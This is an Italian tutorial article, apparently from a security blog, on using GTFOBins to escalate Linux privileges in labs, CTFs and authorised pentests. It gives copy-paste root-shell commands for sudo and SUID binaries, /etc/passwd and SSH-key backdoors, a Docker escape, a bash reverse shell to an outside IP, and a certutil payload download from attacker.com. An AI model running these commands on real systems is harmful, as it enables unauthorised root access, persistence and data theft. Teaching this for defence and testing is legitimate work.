---
title: 'GTFOBins: Abuso Binari Linux per Privilege Escalation'
slug: gtfobins
description: >-
  GTFOBins è il database definitivo per sfruttare binari Linux legittimi in
  privilege escalation, bypass sudo e shell escape in lab autorizzati.
image: /Gemini_Generated_Image_kdyka9kdyka9kdyk.webp
draft: false
date: 2026-02-14T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - LOLBins
---

GTFOBins (GTFO sta per "Get The F\*\*\* Out") non è un tool da eseguire, ma un **knowledge base online** che cataloga binary Unix standard e come possono essere abusati per privilege escalation, file read/write, shell escape, e altre tecniche offensive. È essenzialmente un manuale di exploitation per comandi che trovi su ogni sistema Linux/Unix.

Quando fai enumeration e trovi "User può eseguire sudo /usr/bin/vim" o "SUID binary /usr/bin/find", la tua prossima domanda è: "come exploito questo?". GTFOBins è la risposta. Invece di cercare su Google o ricordare sintassi oscure, vai su gtfobins.github.io, cerchi il binary, e ottieni exploitation step-by-step copy-paste ready.

Il database copre oltre 150 binary Unix comuni (vim, find, tar, less, more, python, perl, etc.) e per ognuno mostra come abusarlo in diversi contesti: sudo, SUID, capabilities, file upload, file download, shell escape, e altri. Ogni tecnica è testata e verificata, con esempi pratici che funzionano.

GTFOBins è diventato strumento essenziale per penetration tester perché elimina il problema del "conosco la vulnerabilità ma non come sfruttarla". Trovi sudo misconfiguration? GTFOBins. SUID binary sospetto? GTFOBins. Restricted shell? GTFOBins. È il tuo Swiss Army knife dell'exploitation Unix.

In questo articolo imparerai come usare GTFOBins efficacemente, quali categorie di exploitation esistono, come combinarlo con enumeration tools, e come contribuire al database. Vedrai esempi pratici di exploitation da CTF e pentest reali, pattern recognition per identificare binary sfruttabili, e tecniche avanzate di chaining.

GTFOBins si posiziona nella kill chain nella fase **Exploitation**, subito dopo aver identificato configurazioni errate tramite enumeration.

***

## 1️⃣ Cos'è GTFOBins e Come Funziona

### Struttura del database

GTFOBins è ospitato su **[https://gtfobins.github.io](https://gtfobins.github.io)** ed è open source su GitHub.

**Categorie di exploitation:**

Ogni binary nel database ha una o più di queste categorie:

| **Categoria**     | **Descrizione**             | **Use Case**                                   |
| ----------------- | --------------------------- | ---------------------------------------------- |
| **Shell**         | Spawna shell interattiva    | Escape da restricted shell, sudo abuse         |
| **Command**       | Esegue comandi arbitrari    | RCE quando binary è trusted                    |
| **Reverse shell** | Crea connessione outbound   | Remote access quando shell diretta bloccata    |
| **File upload**   | Scrive file su filesystem   | Caricare backdoor, SSH keys                    |
| **File download** | Scarica file remoti         | Exfiltrazione dati                             |
| **File write**    | Scrive contenuto in file    | Modifica /etc/passwd, config files             |
| **File read**     | Legge file arbitrari        | Leggere /etc/shadow, chiavi private            |
| **SUID**          | Exploitation di SUID binary | Privilege escalation da user a root            |
| **Sudo**          | Abuse di sudo permission    | Privilege escalation via sudo misconfiguration |
| **Capabilities**  | Sfrutta Linux capabilities  | Privilege escalation su sistemi moderni        |
| **Limited SUID**  | SUID con limitazioni        | Partial privesc                                |

🎓 **Come usare il database:**

1. Vai su [https://gtfobins.github.io](https://gtfobins.github.io)
2. Search bar in alto: digita nome binary (es. "vim")
3. Clicca sul binary
4. Vedi tutte le categorie disponibili
5. Copy-paste comandi per la tua situazione

***

### Esempio pratico: vim con sudo

**Scenario:** Enumeration ha trovato:

```bash
sudo -l
# User john may run: (ALL) NOPASSWD: /usr/bin/vim
```

**GTFOBins lookup:**

1. Vai su [https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)
2. Scroll a sezione "Sudo"
3. Vedi exploitation:

```bash
sudo vim -c ':!/bin/sh'
```

**Execution:**

```bash
john@target:~$ sudo vim -c ':!/bin/sh'
# root shell immediata!
# whoami
root
```

🎓 **Cosa è successo:** Vim con flag `-c` esegue comando al startup. `:!/bin/sh` in vim esegue shell. Siccome vim parte con sudo, la shell è root.

**Timeline:** 30 secondi dall'identification a root shell.

***

## 2️⃣ Categorie di Exploitation Principali

### Shell escape

**Quando usare:** Sei in restricted shell, limited shell, o applicazione interattiva che non ti dà shell diretta.

**Binary comuni per shell escape:**

```bash
# vim/vi
vim
# In vim, digita:
:!/bin/bash

# less/more
less /etc/passwd
# In less, digita:
!/bin/bash

# man
man ls
# In man (pager), digita:
!/bin/bash

# python
python -c 'import os; os.system("/bin/bash")'

# perl
perl -e 'exec "/bin/bash";'
```

**Scenario reale:** SSH login che apre menu application invece di shell:

```bash
# Ti trovi in menu applicazione
# Opzioni: 1. View logs  2. Check status  3. Exit

# Premi Ctrl+Z per suspend
^Z

# Se non funziona, cerca opzione "help" o "view"
# Molte applicazioni usano less/more per help

# Nel pager:
!/bin/bash
# Shell ottenuta!
```

***

### Sudo exploitation

**Pattern recognition:** Quando vedi output `sudo -l` con NOPASSWD, first stop è GTFOBins.

**Esempi exploitation:**

**find con sudo:**

```bash
sudo find . -exec /bin/bash \; -quit
# root shell
```

**tar con sudo:**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# root shell
```

**systemctl con sudo:**

```bash
sudo systemctl status anything
# In pager:
!sh
# root shell
```

**apt/apt-get con sudo:**

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
# root shell prima di update
```

🎓 **Pattern comune:** Molti binary che interagiscono con pager (less/more) permettono `!command` execution. systemctl, man, journalctl, git, etc.

***

### SUID binary exploitation

**Pattern recognition:** Enumeration trova SUID binary uncommon. Check GTFOBins per exploitation.

**Esempi:**

**python SUID:**

```bash
# SUID python binary
ls -la /usr/bin/python3.8
# -rwsr-xr-x 1 root root

# Exploitation
/usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
# root shell
```

🎓 **Nota `-p` flag:** In bash, `-p` mantiene effective UID. Senza `-p`, bash droppa privilegi SUID per sicurezza.

**cp SUID:**

```bash
# SUID cp binary
/usr/bin/cp /bin/bash /tmp/rootbash
/tmp/rootbash -p
# root shell
```

**find SUID:**

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
# root shell
```

**tar SUID:**

```bash
/usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# root shell
```

***

### File read (leggere file privilegiati)

**Use case:** Devi leggere `/etc/shadow`, chiavi SSH di root, o file protetti.

**Esempi:**

**base64 con [SUID](https://hackita.it/articoli/suid):**

```bash
# Leggi /etc/shadow
/usr/bin/base64 /etc/shadow | base64 -d
```

**strings con SUID:**

```bash
/usr/bin/strings /root/.ssh/id_rsa
```

**less con sudo:**

```bash
sudo less /etc/shadow
# Vedi contenuto direttamente
```

**vim con sudo:**

```bash
sudo vim /etc/shadow
# Leggi e puoi anche editare!
```

***

### File write (scrivere file privilegiati)

**Use case:** Vuoi modificare `/etc/passwd` per aggiungere user root, o scrivere SSH authorized\_keys.

**Esempi:**

**tee con sudo:**

```bash
# Aggiungi user root a /etc/passwd
echo 'hacker:x:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd

# Set password
sudo passwd hacker
# Password: [enter password]

# Switch to new root user
su hacker
# root shell
```

**cp con sudo:**

```bash
# Backup originale
sudo cp /etc/passwd /tmp/passwd.bak

# Modifica locale
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
cat /tmp/passwd.bak >> /tmp/passwd.new

# Sovrascrivi originale
sudo cp /tmp/passwd.new /etc/passwd
```

**vim con sudo:**

```bash
sudo vim /etc/passwd
# In vim, aggiungi linea:
# hacker::0:0:root:/root:/bin/bash
# (password vuota = no password needed)
# Salva e esci

su hacker
# root shell senza password
```

***

## 3️⃣ Workflow Pratico: Enumeration to Exploitation

### Step 1: Enumeration (identifica binary exploitable)

```bash
# Check sudo permissions
sudo -l
# Output:
# User www-data may run: (ALL) NOPASSWD: /usr/bin/systemctl restart webapp

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Output:
# /usr/bin/find
# /usr/bin/vim.basic
# /usr/local/bin/backup  ← Uncommon!
```

***

### Step 2: GTFOBins lookup

**Per sudo:**

```bash
# Binary: systemctl
# Search su GTFOBins: https://gtfobins.github.io/gtfobins/systemctl/
# Categoria: Sudo
```

**Exploitation trovata:**

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```

Ma questo è complesso. **Alternativa più semplice** sempre in GTFOBins:

```bash
sudo systemctl status webapp
# Nel pager:
!sh
# root shell immediata!
```

***

### Step 3: Exploitation

```bash
www-data@target:~$ sudo systemctl status webapp
● webapp.service - Web Application Service
   Loaded: loaded (/etc/systemd/system/webapp.service)
   Active: active (running)
   [...]

# Digita:
!/bin/bash
# root@target:/#

whoami
# root
```

**Timeline totale:** 2 minuti (enumeration + GTFOBins lookup + exploitation)

***

## 4️⃣ Tecniche Avanzate

### Chaining multiple GTFOBins techniques

**Scenario:** Hai sudo su comando limitato che non dà shell diretta. Chain con altre tecniche.

**Esempio:**

```bash
sudo -l
# User può eseguire: (ALL) NOPASSWD: /usr/bin/git
```

**GTFOBins git → shell:**

```bash
sudo git -p help
# In pager:
!/bin/bash
# root shell
```

**Ma se pager disabled?** Chain con file write:

```bash
# Git può eseguire hooks come root
sudo git init /tmp/repo
cd /tmp/repo

# Crea hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x .git/hooks/pre-commit

# Trigger hook
sudo git commit --allow-empty -m "test"

# Esegui SUID bash creata
/tmp/rootbash -p
# root shell
```

***

### Custom binary exploitation research

**Scenario:** Trovi SUID binary custom non in GTFOBins. Usa GTFOBins patterns per exploitation research.

```bash
# SUID binary custom
ls -la /usr/local/bin/backup
# -rwsr-xr-x 1 root root 16384 /usr/local/bin/backup

# Analisi
strings /usr/local/bin/backup
```

**Output:**

```
/bin/tar czf %s %s
/usr/bin/cp %s %s
Enter source directory:
```

🎓 **Pattern recognition:** Binary usa `tar` e `cp` con format strings. Se non usa path assoluti (`/bin/tar`), è vulnerable a **PATH hijacking**.

**Exploitation (tecnica da GTFOBins tar/cp):**

```bash
# Crea fake tar
cd /tmp
cat > tar << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x tar

# Modifica PATH
export PATH=/tmp:$PATH

# Esegui SUID binary
/usr/local/bin/backup
# Enter source directory: /anything
# Root shell quando chiama "tar"!
```

Se vuoi approfondire i top 100 comandi più usati di kali linux clicca [qui](https://hackita.it/articoli/top-100-comandi-linux).

***

### Capabilities exploitation (Linux moderni)

**Scenario:** Sistema moderno usa capabilities invece di SUID tradizionali.

```bash
# Enumeration capabilities
getcap -r / 2>/dev/null
```

**Output:**

```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

🎓 **cap\_setuid:** Permette al binary di cambiare UID (setuid syscall).

**GTFOBins lookup: python capabilities**

```bash
# https://gtfobins.github.io/gtfobins/python/
# Categoria: Capabilities
```

**Exploitation:**

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root shell
```

***

### Container escape con GTFOBins

**Scenario:** Sei in Docker container con sudo su binary specifici.

```bash
# In container
sudo -l
# User può eseguire: (ALL) NOPASSWD: /usr/bin/docker
```

**GTFOBins docker → container escape:**

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# root shell sull'HOST, non nel container!
```

🎓 **Cosa è successo:** Docker con sudo può montare filesystem host (`/`) nel container. `chroot /mnt` fa escape verso host.

Per approfondire container escape techniques e Docker security, consulta [tecniche di escape da container Docker e Kubernetes](https://hackita.it/articoli/container-escape).

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: CTF privesc via sudo find

**Contesto:** CTF box. User `lowpriv`. Obiettivo: root flag.

```bash
# Enumeration
lowpriv@box:~$ sudo -l
# User lowpriv may run: (ALL) NOPASSWD: /usr/bin/find
```

**GTFOBins lookup:**

```
https://gtfobins.github.io/gtfobins/find/
Categoria: Sudo
```

**Exploitation (copy-paste da GTFOBins):**

```bash
lowpriv@box:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root

# cat /root/root.txt
[FLAG_HERE]
```

**Timeline:** 1 minuto

**COSA FARE SE FALLISCE:**

* **Shell chiude subito:** Alcuni sistemi hanno restricted bash. Usa: `sudo find . -exec /bin/bash -p \; -quit`
* **Permission denied:** Verifica che sudo NOPASSWD sia corretto con `sudo -l` di nuovo
* **Find non esegue -exec:** Rara ma possibile. Prova alternative find syntax da GTFOBins

***

### Scenario B: Enterprise pentest - vim sudo abuse

**Contesto:** Application server. User `developer` con sudo limitato.

```bash
developer@appserver:~$ sudo -l
# User developer may run: (ALL) NOPASSWD: /usr/bin/vim /opt/app/config.yml
```

🎓 **Nota:** Sudo limitato a file specifico, MA vim può ancora fare shell escape.

**GTFOBins vim → shell:**

```bash
developer@appserver:~$ sudo vim /opt/app/config.yml

# In vim, digita:
:set shell=/bin/bash
:shell
# root shell!

root@appserver:/# cat /etc/shadow
# Dumpa password hashes per cracking offline
```

**Alternative exploitation (file write):**

```bash
# In vim (come root via sudo)
:e /root/.ssh/authorized_keys

# Aggiungi tua SSH key
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali

# Salva
:wq

# Dalla tua macchina
ssh -i id_rsa root@appserver
# root@appserver:~#
```

**Timeline:** 2 minuti

***

### Scenario C: SUID exploitation - python with GTFOBins

**Contesto:** Web server compromised. User `www-data`.

```bash
www-data@webserver:/tmp$ find / -perm -4000 2>/dev/null
# [output standard SUID binaries]
# /usr/bin/python3.6
```

**Verifica SUID:**

```bash
www-data@webserver:/tmp$ ls -la /usr/bin/python3.6
# -rwsr-xr-x 1 root root 4526456 Apr 15  2022 /usr/bin/python3.6
```

**GTFOBins python SUID:**

```
https://gtfobins.github.io/gtfobins/python/
Categoria: SUID
```

**Exploitation:**

```bash
www-data@webserver:/tmp$ /usr/bin/python3.6 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-4.4# whoami
root
```

**Timeline:** 1 minuto

**COSA FARE SE FALLISCE:**

* **Bash drops privileges:** Usa `os.setuid(0); os.system("/bin/bash")` invece
* **Python version mismatch:** GTFOBins examples funzionano con qualsiasi Python, syntax identica

***

## 6️⃣ Integrazione Toolchain

### Enumeration Tools → GTFOBins

**LinPEAS output:**

```
[!] NOPASSWD sudo found:
    User can run: /usr/bin/systemctl
```

**Next step:**

```bash
# GTFOBins lookup: systemctl
# Exploitation: sudo systemctl status X → !sh
```

***

**Unix-PrivEsc-Check output:**

```
[!] WARNING: Uncommon SUID binary: /usr/bin/perl
```

**Next step:**

```bash
# GTFOBins: perl SUID
# Exploitation: /usr/bin/perl -e 'exec "/bin/bash";'
```

***

### GTFOBins + Metasploit

**Metasploit session → GTFOBins escalation:**

```bash
# Hai meterpreter session come user
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'

user@target:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/zip

# GTFOBins zip sudo
user@target:~$ TF=$(mktemp -u)
user@target:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
# root shell

# Background shell e upgrade meterpreter
^Z
sessions -u -1
# Meterpreter root session
```

***

### Automated GTFOBins lookup

**Script per automated lookup:**

```python
#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup

def gtfobins_lookup(binary, category="sudo"):
    url = f"https://gtfobins.github.io/gtfobins/{binary}/"
    
    try:
        r = requests.get(url)
        if r.status_code == 404:
            print(f"[-] {binary} not in GTFOBins")
            return
        
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Find section by category
        section = soup.find('h2', text=category.capitalize())
        if not section:
            print(f"[-] {binary} doesn't have {category} exploitation")
            return
        
        # Get code example
        code = section.find_next('code')
        if code:
            print(f"[+] {binary} {category} exploitation:")
            print(code.get_text())
        
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: gtfo.py <binary> [category]")
        sys.exit(1)
    
    binary = sys.argv[1]
    category = sys.argv[2] if len(sys.argv) > 2 else "sudo"
    
    gtfobins_lookup(binary, category)
```

**Usage:**

```bash
python3 gtfo.py vim sudo
# [+] vim sudo exploitation:
# sudo vim -c ':!/bin/sh'

python3 gtfo.py find suid
# [+] find suid exploitation:
# ./find . -exec /bin/sh -p \; -quit
```

***

## 7️⃣ Attack Chain con GTFOBins

### Web App → Shell → Sudo → Root

**FASE 1: SQL Injection to Shell**

```bash
# SQLi to RCE
sqlmap -u "http://target.com/page?id=1" --os-shell
# SQL Shell obtained

# Upgrade
bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
```

**Timeline:** 10 minuti

***

**FASE 2: Enumeration**

```bash
www-data@target:/var/www$ sudo -l
# User www-data may run: (ALL) NOPASSWD: /usr/bin/git
```

**Timeline:** 30 secondi

***

**FASE 3: GTFOBins Lookup**

```
https://gtfobins.github.io/gtfobins/git/
Categoria: Sudo
```

**Exploitation method trovato:** git help → pager → shell escape

**Timeline:** 1 minuto

***

**FASE 4: Privilege Escalation**

```bash
www-data@target:/var/www$ sudo git -p help
# Git help apre pager

# In pager:
!/bin/bash
# root@target:/#

whoami
# root

cat /root/root.txt
```

**Timeline:** 30 secondi

***

**TOTALE:** \~12 minuti da SQL injection a root flag.

**Ruolo di GTFOBins:** Ha trasformato "sudo git" (configurazione comune, non ovviamente exploitable) in root shell in 30 secondi. Senza GTFOBins, avresti dovuto:

1. Ricercare manualmente exploitation git
2. Testare varie tecniche
3. Forse non trovare mai il pager trick

***

## 8️⃣ Contribuire a GTFOBins

### Come aggiungere nuovo binary

GTFOBins è community-driven. Puoi contribuire!

**Processo:**

1. **Fork repository:** [https://github.com/GTFOBins/GTFOBins.github.io](https://github.com/GTFOBins/GTFOBins.github.io)
2. **Crea file markdown** per nuovo binary in `_gtfobins/`
3. **Segui template:**

```markdown
---
functions:
  shell:
    - description: Spawns interactive shell
      code: |
        newbinary
        :!/bin/bash
  sudo:
    - description: Runs shell with sudo
      code: |
        sudo newbinary -flag /bin/bash
---
```

1. **Testa exploitation** su VM
2. **Submit Pull Request**

***

### Quality guidelines

Per accettazione PR:

✅ Exploitation deve funzionare su Ubuntu/Debian standard
✅ Codice deve essere copy-paste ready
✅ Descrizione chiara del contesto
✅ Multiple methods se esistono alternative
❌ No exploitation che richiede setup complesso
❌ No binary proprietari non installabili

***

## 9️⃣ GTFOBins Alternatives e Resources

### LOLBins (Windows equivalent)

**LOLBAS Project:** [https://lolbas-project.github.io](https://lolbas-project.github.io)

Living Off The Land Binaries and Scripts per Windows. Stesso concept di GTFOBins ma per cmd.exe, powershell, etc.

**Esempio:** certutil.exe per file download:

```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
```

***

### GTFOArgs

**GTFOArgs:** [https://gtfoargs.github.io](https://gtfoargs.github.io)

Estensione di GTFOBins che mostra exploitation via argument injection.

**Use case:** Binary esegue comando con user input non sanitizzato.

***

### HackTricks

**HackTricks Linux Privesc:** [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

Complementare a GTFOBins. Copre privilege escalation techniques oltre binary exploitation.

Se vuoi una visione completa delle tecniche di privilege escalation Linux, combina GTFOBins con la nostra guida [comprehensive privilege escalation roadmap per Linux](https://hackita.it/articoli/linux-privesc).

***

## 10️⃣ Tabelle Tecniche

### Binary Exploitation Quick Reference

| **Binary**    | **Sudo**                           | **SUID**                          | **Capabilities** | **Shell Escape** |
| ------------- | ---------------------------------- | --------------------------------- | ---------------- | ---------------- |
| **vim**       | ✅ `:!/bin/bash`                    | ✅ `:!/bin/bash -p`                | ⚠️ Rare          | ✅ Yes            |
| **find**      | ✅ `-exec /bin/sh \;`               | ✅ `-exec /bin/sh -p \;`           | ❌ No             | ⚠️ Limited       |
| **python**    | ✅ `-c 'import os; os.system(...)'` | ✅ `-c 'import os; os.execl(...)'` | ✅ `cap_setuid`   | ✅ Yes            |
| **tar**       | ✅ `--checkpoint-action=exec`       | ✅ Same                            | ❌ No             | ⚠️ Limited       |
| **less**      | ✅ `!sh`                            | ⚠️ Difficult                      | ❌ No             | ✅ Yes            |
| **systemctl** | ✅ `status → !sh`                   | ❌ No sudo needed                  | ❌ No             | ⚠️ Via pager     |
| **git**       | ✅ `-p help → !sh`                  | ⚠️ Difficult                      | ❌ No             | ⚠️ Via pager     |

***

### Categoria Priority Matrix

Quando hai binary exploitable, quale categoria usare?

| **Situazione**    | **Categoria Consigliata**              | **Perché**                        |
| ----------------- | -------------------------------------- | --------------------------------- |
| sudo NOPASSWD     | **Sudo → Shell**                       | Più veloce: 1 comando = root      |
| SUID binary       | **SUID → Shell**                       | Diretto privilege escalation      |
| Restricted shell  | **Shell escape**                       | Prima esci, poi escalate          |
| Need exfiltration | **File read** poi **File download**    | Leggi sensitive data, esfiltrati  |
| Need persistence  | **File write**                         | Aggiungi SSH keys, cron jobs      |
| Container         | **Command** o **Shell** + mount tricks | Escape richiede filesystem access |

***

## 11️⃣ Troubleshooting

### Binary in GTFOBins ma exploitation fallisce

**Problema comune 1: Flags bloccate**

```bash
# GTFOBins dice:
sudo vim -c ':!/bin/sh'

# Tuo sistema:
Sorry, user is not allowed to execute '/usr/bin/vim -c :!/bin/sh'
```

**Causa:** Sudoers configuration limita flags: `vim /path/to/file` OK, `vim -c` blocked.

**Fix:** Usa exploitation senza flags:

```bash
sudo vim /etc/hosts
# In vim:
:!/bin/bash
```

***

**Problema comune 2: Pager disabilitato**

```bash
# GTFOBins: systemctl status → !sh
sudo systemctl status webapp
# Output senza pager (diretto a stdout)
```

**Causa:** PAGER variable non set o output breve (non triggera pager).

**Fix:** Forza pager:

```bash
PAGER='sh -c "sh 0<&1"' sudo -E systemctl status webapp
```

***

**Problema comune 3: SUID bash drops privileges**

```bash
# SUID bash binary
/tmp/bash-suid
# $ whoami
# user  ← Non root!
```

**Causa:** Bash moderna droppa privileges SUID se invoked as `bash`.

**Fix:** Usa `-p` flag:

```bash
/tmp/bash-suid -p
# bash-4.4# whoami
# root
```

***

### Binary NON in GTFOBins

**Approccio:**

1. **Cerca binary simili:** Se hai `vim.basic`, cerca `vim` in GTFOBins
2. **Analizza con strings:**

```bash
strings /usr/local/bin/custom-tool | grep -E "system|exec|popen"
```

1. **Test manual:** Prova flag comuni `-c`, `--exec`, `-e`, `--command`
2. **Contribuisci a GTFOBins** se trovi exploitation!

***

## 12️⃣ FAQ

**Q: GTFOBins funziona solo su Linux?**

A: Principalmente Linux/Unix. Molti binary (vim, python, perl, find) esistono anche su macOS/BSD e exploitation è identica o simile. Per Windows usa **LOLBAS** (Living Off The Land Binaries).

***

**Q: Tutte le exploitation in GTFOBins funzionano sempre?**

A: \~95% funzionano out-of-box. Alcuni possono fallire per:

* Versioni binary differenti (rare syntax changes)
* Configurazioni sistema (es. restricted sudoers)
* Hardening custom (AppArmor, SELinux)
  Quando fallisce, prova method alternative nella stessa pagina GTFOBins.

***

**Q: Posso usare GTFOBins offline?**

A: Sì! Clona repository:

```bash
git clone https://github.com/GTFOBins/GTFOBins.github.io.git
cd GTFOBins.github.io
```

Files markdown in `_gtfobins/` sono human-readable anche senza web server.

Oppure run Jekyll locally:

```bash
bundle install
bundle exec jekyll serve
# http://localhost:4000
```

***

**Q: Come scelgo tra multiple exploitation methods?**

A: Priority:

1. **Più semplice** (meno comandi)
2. **Meno rilevabile** (se stealth importante)
3. **Più affidabile** (testata su più sistemi)

Esempio vim sudo: `vim -c ':!/bin/sh'` è più semplice di creare file `.vimrc` con autocommand.

***

**Q: GTFOBins è legale da usare?**

A: GTFOBins è **knowledge base**, non tool. Leggere documentazione è legale. **Usare tecniche su sistemi non autorizzati è illegale.** Usa solo in:

* Lab personali
* CTF autorizzati
* Pentest con contratto firmato

***

**Q: Quanto spesso GTFOBins è aggiornato?**

A: Community-driven, update continui. Check GitHub commits: [https://github.com/GTFOBins/GTFOBins.github.io/commits/master](https://github.com/GTFOBins/GTFOBins.github.io/commits/master)

Nuovo binary aggiunto ogni 1-2 settimane in media. Bug fix più frequenti.

***

## 13️⃣ Cheat Sheet Finale

### Top 10 Binary per Privilege Escalation

| **Binary**    | **Sudo Exploitation**                                                              | **SUID Exploitation**                                     |
| ------------- | ---------------------------------------------------------------------------------- | --------------------------------------------------------- |
| **vim**       | `sudo vim -c ':!/bin/sh'`                                                          | `vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'` |
| **find**      | `sudo find . -exec /bin/sh \; -quit`                                               | `find . -exec /bin/sh -p \; -quit`                        |
| **python**    | `sudo python -c 'import os; os.system("/bin/sh")'`                                 | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`  |
| **less**      | `sudo less /etc/profile` → `!/bin/sh`                                              | Limited                                                   |
| **more**      | `sudo more /etc/profile` → `!/bin/sh`                                              | Limited                                                   |
| **tar**       | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | Same with `-p` flag                                       |
| **git**       | `sudo git -p help` → `!/bin/sh`                                                    | Limited                                                   |
| **systemctl** | `sudo systemctl status X` → `!sh`                                                  | N/A                                                       |
| **perl**      | `sudo perl -e 'exec "/bin/sh";'`                                                   | `perl -e 'exec "/bin/sh -p";'`                            |
| **awk**       | `sudo awk 'BEGIN {system("/bin/sh")}'`                                             | `awk 'BEGIN {system("/bin/sh -p")}'`                      |

***

### GTFOBins Workflow

```
1. ENUMERATION
   ├─ sudo -l  →  Identify sudo binaries
   └─ find / -perm -4000  →  Identify SUID binaries

2. GTFOBINS LOOKUP
   ├─ https://gtfobins.github.io
   └─ Search binary name

3. SELECT CATEGORY
   ├─ Sudo (if sudo NOPASSWD)
   ├─ SUID (if SUID binary)
   ├─ Shell (if restricted shell)
   └─ Capabilities (if Linux capabilities)

4. COPY-PASTE EXPLOITATION
   └─ Execute command from GTFOBins

5. ROOT SHELL
   └─ Verify: whoami
```

***

## Disclaimer

GTFOBins è un **progetto educativo e di security research** che documenta tecniche di exploitation per binary Unix. La documentazione è pubblica e open source.

L'uso di tecniche descritte in GTFOBins su sistemi senza autorizzazione esplicita scritta del proprietario costituisce accesso non autorizzato ed è illegale in tutte le giurisdizioni.

Utilizza GTFOBins e tecniche correlate esclusivamente in:

* Ambienti di laboratorio controllati (VM, CTF platforms, HackTheBox)
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato e scope definito

L'autore di questo articolo e HackIta declinano ogni responsabilità per usi impropri o illegali.

**GTFOBins repository:** [https://github.com/GTFOBins/GTFOBins.github.io](https://github.com/GTFOBins/GTFOBins.github.io)

**GTFOBins website:** [https://gtfobins.github.io](https://gtfobins.github.io)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
